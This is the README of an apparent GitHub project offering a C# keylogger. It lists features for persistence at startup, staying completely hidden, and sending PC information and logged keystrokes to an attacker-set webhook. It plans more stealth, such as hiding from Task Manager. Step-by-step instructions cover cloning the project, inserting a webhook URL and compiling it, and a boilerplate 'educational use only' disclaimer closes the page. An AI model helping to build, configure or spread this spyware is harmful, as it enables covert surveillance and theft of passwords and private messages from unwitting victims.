# Keylogger (C#)
***  
# Features 
 - [x] Add itself to startup
 - [x] Sends PC information to webhook on run
 - [x] Stays completely hidden
 - [x] Logs keystrokes and sends them to the webhook

## Soon

- [ ] Smart keylogging
- [ ] Hidden on task manager

***

# Installation Guide

## 1. Clone the Repository
```bash
git clone https://github.com/Daniel-191/Keylogger
cd Keylogger
```

## 2. Open the Project
```bash
# Open in Visual Studio
start Keylogger.sln

# Or open in VS Code
code .
```

## 3. Configure Required Value
Open `main.cs` in your editor of choosing and replace `YOUR_WEBHOOK_HERE` with your actual webhook URL.

## 4. Compile to Executable
```bash
# Restore dependencies
dotnet restore

# Build in Release mode
dotnet build -c Release
```

***
> [!WARNING]
> ***Educational use only.***
> This project exists for learning, testing, and research purposes.
> You must use it only in environments you own or explicitly control.
> You must have clear, documented permission from all affected parties.
> The developers do not encourage misuse.
> The developers do not participate in misuse.
> The developers are not responsible for actions taken by others.
> You are fully responsible for how you use this software.
> You must follow applicable laws, platform rules, and ethical standards.
